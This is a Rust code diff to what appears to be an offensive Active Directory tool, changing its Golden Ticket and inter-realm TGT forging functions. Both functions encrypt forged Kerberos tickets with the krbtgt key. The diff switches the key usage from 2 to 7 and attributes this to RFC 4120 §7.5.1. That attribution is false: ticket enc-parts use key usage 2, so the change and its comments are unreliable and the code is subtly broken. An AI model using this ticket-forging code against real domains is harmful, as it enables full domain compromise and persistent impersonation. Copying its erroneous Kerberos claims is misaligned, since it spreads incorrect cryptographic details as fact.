@@ -101,10 +101,10 @@ pub async fn forge_golden_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         }]),
     };
 
-    // Encrypt with krbtgt key (key_usage=2 for TGS ticket)
+    // Encrypt with krbtgt key (key_usage=7 for TGT enc-part per RFC 4120 §7.5.1)
     let cipher = new_kerberos_cipher(etype)
         .map_err(|e| OverthroneError::TicketForge(format!("Cipher init: {e}")))?;
-    let encrypted = cipher.encrypt(&key, 2, &enc_ticket_part.build());
+    let encrypted = cipher.encrypt(&key, 7, &enc_ticket_part.build());
 
     let ticket = Ticket {
         tkt_vno: 5,
@@ -251,7 +251,8 @@ pub async fn forge_interrealm_tgt(
 
     let cipher = new_kerberos_cipher(etype)
         .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;
-    let encrypted = cipher.encrypt(&key, 2, &enc_ticket_part.build());
+    // key_usage=7 for TGT enc-part (RFC 4120 §7.5.1)
+    let encrypted = cipher.encrypt(&key, 7, &enc_ticket_part.build());
 
     // SPN is krbtgt/TARGET@SOURCE (the trust account)
     let ticket = Ticket {
@@ -570,7 +571,7 @@ fn build_kerb_validation_info(
     // Deferred data: username string
     buf.extend_from_slice(&uname_utf16);
     // Pad to 4 bytes
-    while !buf.len().is_multiple_of(4) {
+    while buf.len() % 4 != 0 {
         buf.push(0);
     }
 
